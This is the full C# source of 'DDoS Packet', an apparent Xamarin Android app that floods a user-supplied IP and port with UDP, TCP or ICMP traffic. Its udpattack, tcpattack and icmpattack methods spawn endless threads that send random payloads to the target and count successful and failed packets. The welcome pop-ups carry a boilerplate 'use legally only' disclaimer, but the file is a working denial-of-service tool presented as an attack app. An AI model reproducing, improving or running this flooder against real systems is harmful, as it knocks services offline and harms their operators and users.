using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Xamarin.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Net.NetworkInformation;

namespace DDoSPacket
{
    public partial class MainPage : ContentPage
    {
        public int amountint = 0;
        public int amountfint = 0;
        public MainPage()
        {
            InitializeComponent();
            NP.Items.Add("UDP");
            NP.Items.Add("TCP");
            NP.Items.Add("ICMP");
            startup();
        }
        void startup()
        {
            Device.StartTimer(TimeSpan.FromMilliseconds(50), () =>
            {
                DisplayAlert("Welcome", "Warning: We are not responsible for any damage caused by this application please legally to use only! \nVersion: 1.0.0 Beta \nUpdate:\n -Change attack system.", "OK");
                return false;
            });
        }
        void update()
        {
            Device.StartTimer(TimeSpan.FromMilliseconds(50), () =>
            {
                int checkdone = amountint + amountfint;
                if (checkdone == int.Parse(thread.Text))
                {
                    DisplayAlert("Attack Status", "Attack success\nAmount: " + amountint + "\nFailed: " + amountfint + "\nType: " + NP.SelectedItem, "OK");
                    amountfint = 0;
                    amountint = 0;
                }
                else
                {
                    amount.Text = "Packet are send success: " + amountint;
                    amountf.Text = "Packet are send unsuccess: " + amountfint;
                }
                return true;
            });
        }

        void start(object sender, EventArgs args)
        {

            if (ip.Text == null)
            {
                DisplayAlert("Failed to Attack", "IP Box is null!", "OK");
                return;
            }
            else if (port.Text == null)
            {
                DisplayAlert("Failed to Attack", "Port Box is null!", "OK");
                return;
            }
            if (thread.Text == null)
            {
                DisplayAlert("Failed to Attack", "Thread Box is null!", "OK");
                return;
            }
            if (NP.SelectedItem == null)
            {
                DisplayAlert("Failed to Attack", "Network Protocol is null!", "OK");
                return;
            }
            if (NP.SelectedItem == "UDP")
            {
                DisplayAlert("Attack Status", "Started Attacking.\nType: UDP", "OK");
                amountfint = 0;
                amountint = 0;
                update();
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(thread.Text); i++)
                    {
                        udpattack();
                    }
                }).Start();
            }
            else if (NP.SelectedItem == "TCP")
            {
                amountfint = 0;
                amountint = 0;
                DisplayAlert("Attack Status", "Started Attacking.\nType: TCP", "OK");
                update();
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(thread.Text); i++)
                    {
                        tcpattack();
                    }
                }).Start();

            }
            else if (NP.SelectedItem == "ICMP")
            {
                port.Text = "10";
                amountfint = 0;
                amountint = 0;
                DisplayAlert("Attack Status", "Started Attacking.\nType: ICMP", "OK");
                update();
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(thread.Text); i++)
                    {
                        icmpattack();
                    }
                }).Start();
            }
        }
        void stop(object sender, EventArgs args)
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        void INFO(object sender, EventArgs args)
        {
            DisplayAlert("Welcome", "Welcome to DDoS Packet for Android!\nVersion: 1.0.0 Beta\nDeveloper: fusedevgithub\nWarning: We are not responsible for any damage caused by this application please legally to use only!\nNotice: This version maybe have less methods and many bugs.\nPlease Report if you found!", "OK");
        }
        public static String generateStringSize(long sizeByte)
        {

            StringBuilder sb = new StringBuilder();
            Random rd = new Random();

            var numOfChars = sizeByte;
            string allows = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            int maxIndex = allows.Length - 1;
            for (int i = 0; i < numOfChars; i++)
            {
                int index = rd.Next(maxIndex);
                char c = allows[index];
                sb.Append(c);
            }
            return sb.ToString();
        }
        public void udpattack()
        {

            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
                ProtocolType.Udp);

            IPAddress serverAddr = IPAddress.Parse(ip.Text);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(port.Text));
            string data = generateStringSize(1024 * int.Parse(size.Text));
            byte[] sus = Encoding.ASCII.GetBytes(data);
            sock.Connect(serverAddr, int.Parse(port.Text));
            for (; ; )
            {
                new Thread(() =>
                {
                    try
                    {
                        sock.SendTo(sus, endPoint);
                        amountint++;
                    }
                    catch
                    {
                        amountfint++;
                    }
                }).Start();
            }
        }
        public void tcpattack()
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPAddress serverAddr = IPAddress.Parse(ip.Text);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(port.Text));
            string data = generateStringSize(1024 * int.Parse(size.Text));
            byte[] sus = Encoding.ASCII.GetBytes(data);
            sock.Connect(serverAddr, int.Parse(port.Text));
            for (; ; )
            {
                new Thread(() =>
                {
                    try
                    {
                        sock.SendTo(sus, endPoint);
                        amountint++;
                    }
                    catch
                    {
                        amountfint++;
                    }
                }).Start();
            }
        }
        public void icmpattack()
        {
            new Thread(() =>
            {
                Ping pingSender = new Ping();
                string data = generateStringSize(1024 * 1);
                byte[] sus = Encoding.ASCII.GetBytes(data);
                int timeout = 5000;
                PingOptions options = new PingOptions(64, true);
                for (; ; )
                {
                    new Thread(() =>
                    {
                        try
                        {
                            PingReply reply = pingSender.Send(ip.Text, timeout, sus, options);
                            amountint++;
                        }
                        catch
                        {
                            amountfint++;
                        }
                    }).Start();
                }
            }).Start();
        }
    }
}
